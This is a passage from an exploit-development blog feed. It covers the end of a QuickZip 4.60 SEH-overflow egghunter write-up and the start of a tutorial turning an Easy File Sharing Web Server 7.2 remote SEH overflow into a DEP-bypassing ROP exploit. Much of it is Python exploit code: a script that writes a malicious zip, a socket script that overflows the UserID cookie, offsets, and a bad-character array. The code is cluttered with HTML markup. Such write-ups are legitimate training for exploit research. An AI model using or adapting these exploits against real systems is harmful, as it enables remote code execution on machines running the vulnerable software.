</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">Length</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">exploit</span> <span class="o">=</span> <span class="n">header_1</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">header_2</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">header_3</span> <span class="o">+</span> <span class="n">payload</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">mefile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">cst</span><span class="o">.</span><span class="n">zip</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">w</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;);</span>
</span><span class='line'><span class="n">mefile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">exploit</span><span class="p">);</span>
</span><span class='line'><span class="n">mefile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">Exploit</span> <span class="n">complete</span><span class="err">!</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>When we launch the generated <code>cst.zip</code> file, our exploit will run and after several seconds (as the egghunter goes through the application&rsquo;s memory to locate the &ldquo;egg&rdquo;) we should see the calculator binary open.</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/32.shellcode%20final.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/32.shellcode%20final.png" alt="image" /></a></p>

<p>Success!!</p>

<h2>Summary</h2>

<p>That was pretty much it - we have successfully recreated the QuickZip exploit to work on 64 bit Windows 7!</p>

<p>To sum it up, we achieved this by creating an egghunter exploit using very limited allowed character set (pretty much ASCII printable), wrote our own encoder and jumped around the memory to get to the egghunter code and eventually the shellcode.</p>

<p>Few things to keep in mind:</p>

<ul>
<li>find out what characters you&rsquo;re allowed to use and keep that in mind when errors occur</li>
<li>do not get discouraged if the buffer size is not sufficient - get creative!</li>
<li>make sure you use correct egghunter code (32 bit vs. 64 bit) depending on a platform you&rsquo;re developing an exploit for</li>
<li>writing own encoder is not that hard, but it takes lots of practice and patience</li>
<li>make sure to align the stack before executing shellcode</li>
</ul>


<p>Anyway, hope you found it useful! As always, if you have any questions/ideas/suggestions or just wanna chat infosec, feel free to comment below or hit me up on Twitter <a href="https://twitter.com/TheKnapsy">@TheKnapsy</a> or IRC (mainly <strong>#vulnhub</strong> on freenode).</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Easy File Sharing Web Server v7.2 - Remote SEH Buffer Overflow (DEP Bypass With ROP)]]></title>
    <link href="http://blog.knapsy.com/blog/2015/11/25/easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/"/>
    <updated>2015-11-25T20:46:41+11:00</updated>
    <id>http://blog.knapsy.com/blog/2015/11/25/easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop</id>
    <content type="html"><![CDATA[<p>Just a few weeks ago I attended an amazing training on exploit development on Windows - <a href="https://www.corelan-training.com/index.php/training-2/bootcamp/">Corelan Bootcamp</a>. I have to admit, it&rsquo;s probably the best instructor led course I have ever attended; massive props to Peter &ldquo;<a href="https://twitter.com/corelanc0d3r">corelanc0d3r</a>&rdquo; who is a fantastic teacher and to OJ &ldquo;<a href="https://twitter.com/TheColonial">TheColonial</a>&rdquo; for organising it.</p>

<p>Okay, with credits out of the way, let&rsquo;s talk exploits! Since everything I learned at the bootcamp is still fresh in my head, I thought it will be good to practice it a bit more and make sure all of the information sinks in properly.</p>

<p>So, off I went to <a href="https://exploit-db.com">exploit-db</a> and, after some poking around in DoS and PoC section, I found an exploit that I thought of redesigning and improving - <a href="https://www.exploit-db.com/exploits/38526/">Easy File Sharing Web Server 7.2 - Remote SEH Based Overflow</a>.</p>

<!-- more -->


<p>Everything I described here I&rsquo;ll be treating as a bit of a reference for myself when I forget how things are done. If some parts are unclear or if I skipped some bits and it got confusing, hit me up <a href="https://twitter.com/TheKnapsy">@TheKnapsy</a> or IRC and I&rsquo;ll be happy to chat!</p>

<h2>The Challenge</h2>

<p>Looking at the <a href="https://www.exploit-db.com/exploits/38526/">existing exploit</a>, as you can see, it&rsquo;s a properly working PoC exploit that abuses SEH to achieve code execution, it&rsquo;s remote (which is cool) and&hellip; is actually relatively simple.</p>

<p>However, the main issue is that it assumes we are still living somewhere around 1998 and DEP doesn&rsquo;t exist. Let&rsquo;s rewrite it to bypass DEP and ASLR to make it more suitable for modern environments!</p>

<h2>Preparation</h2>

<p>I won&rsquo;t go into a lot of details around environment setup, I&rsquo;ll assume you have all of the essentials and you know how to configure them properly.</p>

<p>At the very least, you&rsquo;ll need:</p>

<ul>
<li>Windows 7 Professional SP1 x64 (ideally in a VM)</li>
<li>Enabled DEP - as an admin, type in <code>bcdedit /set nx AlwaysOn</code> on the command line</li>
<li>Python</li>
<li><a href="http://debugger.immunityinc.com/">Immunity Debugger</a></li>
<li><a href="https://github.com/corelan/mona">Mona</a> - configure where mona should be saving logs, run <code>!mona config -set workingfolder c:\mona_logs\%p</code> in the Immunity console</li>
<li>Decent text editor - such as <a href="https://notepad-plus-plus.org/">Notepad++</a></li>
<li><a href="https://www.exploit-db.com/apps/60f3ff1f3cd34dec80fba130ea481f31-efssetup.exe">Easy File Sharing Web Server v7.2</a> - duh!</li>
</ul>


<p>With the environment ready to go, let&rsquo;s turn the <a href="https://www.exploit-db.com/exploits/38526/">existing exploit</a> into a more cut down PoC - all we need to know is how to trigger a crash, that&rsquo;s it!</p>

<p>Lets use the code below as a starting point:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">struct</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="o">=</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Usage</span><span class="p">:</span> <span class="n">python</span> <span class="n">efsws</span><span class="o">.</span><span class="n">py</span> <span class="p">[</span><span class="n">host</span><span class="p">]</span> <span class="p">[</span><span class="n">port</span><span class="p">]</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'>    <span class="nb">exit</span><span class="p">()</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">host</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>  <span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="nb">buffer</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="mi">5000</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">httpreq</span> <span class="o">=</span> <span class="p">(</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">GET</span> <span class="o">/</span><span class="n">changeuser</span><span class="o">.</span><span class="n">ghp</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>\<span class="n">r</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span> <span class="n">Mozilla</span><span class="o">/</span><span class="mf">4.0</span>\<span class="n">r</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Host</span><span class="p">:</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span> <span class="n">host</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;:</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">r</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Accept</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;/&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span>\<span class="n">r</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span> <span class="n">en</span><span class="o">-</span><span class="n">us</span>\<span class="n">r</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span>\<span class="n">r</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Referer</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s">&quot;http://&quot;</span><span class="o">&gt;</span><span class="n">http</span><span class="p">:</span><span class="o">//&lt;/</span><span class="n">a</span><span class="o">&gt;&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span> <span class="n">host</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">/</span>\<span class="n">r</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Cookie</span><span class="p">:</span> <span class="n">SESSIONID</span><span class="o">=</span><span class="mi">6771</span><span class="p">;</span> <span class="n">UserID</span><span class="o">=&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">buffer</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;;</span> <span class="n">PassWD</span><span class="o">=</span><span class="p">;</span>\<span class="n">r</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Conection</span><span class="p">:</span> <span class="n">Keep</span><span class="o">-</span><span class="n">Alive</span>\<span class="n">r</span>\<span class="n">n</span>\<span class="n">r</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">httpreq</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>So, in simple terms, we&rsquo;re sending 5000 &ldquo;A&#8221;s in the <code>UserID</code> cookie as a part of GET request sent to the server to trigger a crash.</p>

<h2>Understanding the crash</h2>

<p>Let&rsquo;s trigger the crash and investigate it. Start the server:</p>

<p><img src="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/server_start.png" alt="Server_start PNG" /></p>

<p>Attach Immunity Debugger to the process (<code>File</code> -> <code>Attach</code> -> Select the <code>fsws</code> process -> <code>F9</code> to run it)</p>

<p>Run the exploit from the command line: <code>python poc.py 127.0.0.1 80</code>.</p>

<p>Boom! Crash!</p>

<p><a href="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/first_crash.png"><img src="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/first_crash.png" alt="First_crash PNG" /></a></p>

<p>Notice the line at the bottom saying:</p>

<p><em>Access violation when reading [0000004B] - Use Shift+F7/F8/F9 to pass exception to program</em></p>

<p>This indicates that we have triggered an exception that can be handled by the program. Cool, let&rsquo;s see what&rsquo;s happening in the SEH chain: select <code>View</code> -> <code>SEH Chain</code>.</p>

<p><img src="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/first_crash-seh_overwrite.png" alt="First_crash-SEH_overwrite PNG" /></p>

<p>Awesome news! We have managed to overwrite SEH pointers with our own data and, through this, we&rsquo;ll be able to control execution flow of the program.</p>

<p>But, what exactly triggers the crash? Have a look at the screenshot again - note the value in <code>EAX</code> register - <code>0x41414141</code> and current instruction that&rsquo;s being executed at the address <code>61C277F6</code>- <code>CMP DWORD PTR DS:[EAX+4C],A029A697</code>.</p>

<p>What happened? We were trying to access value at the memory address of <code>EAX + 4C</code>, since EAX is currently <code>0x41414141</code>, which is not a valid address, we can&rsquo;t read from it (or rather, to be specific, we can&rsquo;t read from <code>0x41414141 + 4C</code>) and hence, our program crashes.</p>

<p>To make sure our exploit is reliable and always triggers a crash, we&rsquo;ll have to make sure to always overwrite <code>EAX</code> with an invalid memory address - let&rsquo;s keep that in mind!</p>

<h2>Offsets</h2>

<p>Cool, so now we know why our program crashes. Next step is to calculate offsets to find out what&rsquo;s where and how much data we need to send to overwrite everything of interest to us (<code>EAX</code> register and <code>SEH</code> pointers).</p>

<p>Normally, it would be a painful and cumbersome process, but here comes <code>mona</code> with help (and it will continue helping us out even more later on). In the command field in the Immunity, type in <code>!mona pc 5000</code> to create a circular pattern of 5000 characters to use in our buffer to then be able to automatically find the offsets.</p>

<p>Mona will create a text file with the pattern in a text file <code>pattern.txt</code> under your mona logs directory.</p>

<p>Copy the generated string into the buffer in your exploit (now the buffer should only contain the pattern), start the server again, attach Immunity to it and trigger the crash by running the PoC script (we&rsquo;ll be doing this over and over and over again, so get used to it).</p>

<p>The program should have crashed again, but now <code>EAX</code> and <code>SEH</code> chain have some other values. That&rsquo;s all good - now lets get <code>mona</code> to do the hard work for us and calculate all offsets. Type in <code>!mona findmsp</code> and see what it will come back with.</p>

<p><a href="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/findmsp.png"><img src="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/findmsp.png" alt="findmsp PNG" /></a></p>

<p>Awesome, we have now all infromation about offsets required for our exploit:</p>

<ul>
<li><code>EAX</code> offset is <em>4183</em></li>
<li><code>SEH</code> offset is <em>4059</em></li>
</ul>


<p>Let&rsquo;s rewrite part of the exploit and see if we can overwrite speicifc registers with specific values, consider the following, improved PoC:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Offsets</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">max_size</span> <span class="o">=</span> <span class="mi">5000</span>
</span><span class='line'><span class="n">seh_offset</span> <span class="o">=</span> <span class="mi">4059</span>
</span><span class='line'><span class="n">eax_offset</span> <span class="o">=</span> <span class="mi">4183</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="nb">buffer</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="n">seh_offset</span>                   <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">BBBB</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                            <span class="c"># overwrite nSEH pointer</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">CCCC</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                            <span class="c"># overwrite SEH record</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">eax_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>  <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">DDDD</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                            <span class="c"># overwrite EAX to always trigger an exception</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">max_size</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>    <span class="c"># padding</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>If you trigger the crash again, you should see that <code>EAX</code> is now <code>0x44444444</code> and SEH record is <code>0x43434343</code> (nSEH will be <code>0x42424242</code>, but because we are dealing with DEP, it&rsquo;s not of interest for us in this particular exploit).</p>

<p><a href="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/offsets.png"><img src="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/offsets.png" alt="offsets PNG" /></a></p>

<h2>Bad characters</h2>

<p>Now, next step is to find out which bad characters will stuff up our payload. In this case, because we need to send an entire GET request, it is easy to predict that <code>\x00</code> will be a bad character, as it denotes end of string and will cut our payload short.</p>

<p>We can automatically exclude the NULL byte, but are there any others? Let&rsquo;s find out now, before we start playing with ROP and choosing addresses that may contain bytes that will be messing up our payload.</p>

<p>Let&rsquo;s generate a bytearray (and exclude NULL byte) with <code>!mona bytearray -cpb '\x00'</code>. It will create 2 files, <code>bytearray.txt</code> and <code>bytearray.bin</code>. Copy-paste generated string from <code>bytearray.txt</code> into the exploit <strong>AFTER</strong> the part of overwriting <code>EAX</code> register.</p>

<p>Why? Because to trigger the crash, we want to overwrite <code>EAX</code>, if we put bytearray with potentially bad characters before we overwrite the <code>EAX</code> to trigger a crash, bad character that we don&rsquo;t know of may actually cut our payload short and we&rsquo;ll never trigger the crash!</p>

<p>Our buffer should look like this:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="nb">buffer</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="n">seh_offset</span>                   <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">BBBB</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                            <span class="c"># overwrite nSEH pointer</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">CCCC</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                            <span class="c"># overwrite SEH record</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">eax_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>  <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">DDDD</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                            <span class="c"># overwrite EAX to always trigger an exception</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x01</span>\<span class="n">x02</span>\<span class="n">x03</span>\<span class="n">x04</span>\<span class="n">x05</span>\<span class="n">x06</span>\<span class="n">x07</span>\<span class="n">x08</span>\<span class="n">x09</span>\<span class="n">x0a</span>\<span class="n">x0b</span>\<span class="n">x0c</span>\<span class="n">x0d</span>\<span class="n">x0e</span>\<span class="n">x0f</span>\<span class="n">x10</span>\<span class="n">x11</span>\<span class="n">x12</span>\<span class="n">x13</span>\<span class="n">x14</span>\<span class="n">x15</span>\<span class="n">x16</span>\<span class="n">x17</span>\<span class="n">x18</span>\<span class="n">x19</span>\<span class="n">x1a</span>\<span class="n">x1b</span>\<span class="n">x1c</span>\<span class="n">x1d</span>\<span class="n">x1e</span>\<span class="n">x1f</span>\<span class="n">x20</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x21</span>\<span class="n">x22</span>\<span class="n">x23</span>\<span class="n">x24</span>\<span class="n">x25</span>\<span class="n">x26</span>\<span class="n">x27</span>\<span class="n">x28</span>\<span class="n">x29</span>\<span class="n">x2a</span>\<span class="n">x2b</span>\<span class="n">x2c</span>\<span class="n">x2d</span>\<span class="n">x2e</span>\<span class="n">x2f</span>\<span class="n">x30</span>\<span class="n">x31</span>\<span class="n">x32</span>\<span class="n">x33</span>\<span class="n">x34</span>\<span class="n">x35</span>\<span class="n">x36</span>\<span class="n">x37</span>\<span class="n">x38</span>\<span class="n">x39</span>\<span class="n">x3a</span>\<span class="n">x3b</span>\<span class="n">x3c</span>\<span class="n">x3d</span>\<span class="n">x3e</span>\<span class="n">x3f</span>\<span class="n">x40</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x41</span>\<span class="n">x42</span>\<span class="n">x43</span>\<span class="n">x44</span>\<span class="n">x45</span>\<span class="n">x46</span>\<span class="n">x47</span>\<span class="n">x48</span>\<span class="n">x49</span>\<span class="n">x4a</span>\<span class="n">x4b</span>\<span class="n">x4c</span>\<span class="n">x4d</span>\<span class="n">x4e</span>\<span class="n">x4f</span>\<span class="n">x50</span>\<span class="n">x51</span>\<span class="n">x52</span>\<span class="n">x53</span>\<span class="n">x54</span>\<span class="n">x55</span>\<span class="n">x56</span>\<span class="n">x57</span>\<span class="n">x58</span>\<span class="n">x59</span>\<span class="n">x5a</span>\<span class="n">x5b</span>\<span class="n">x5c</span>\<span class="n">x5d</span>\<span class="n">x5e</span>\<span class="n">x5f</span>\<span class="n">x60</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x61</span>\<span class="n">x62</span>\<span class="n">x63</span>\<span class="n">x64</span>\<span class="n">x65</span>\<span class="n">x66</span>\<span class="n">x67</span>\<span class="n">x68</span>\<span class="n">x69</span>\<span class="n">x6a</span>\<span class="n">x6b</span>\<span class="n">x6c</span>\<span class="n">x6d</span>\<span class="n">x6e</span>\<span class="n">x6f</span>\<span class="n">x70</span>\<span class="n">x71</span>\<span class="n">x72</span>\<span class="n">x73</span>\<span class="n">x74</span>\<span class="n">x75</span>\<span class="n">x76</span>\<span class="n">x77</span>\<span class="n">x78</span>\<span class="n">x79</span>\<span class="n">x7a</span>\<span class="n">x7b</span>\<span class="n">x7c</span>\<span class="n">x7d</span>\<span class="n">x7e</span>\<span class="n">x7f</span>\<span class="n">x80</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
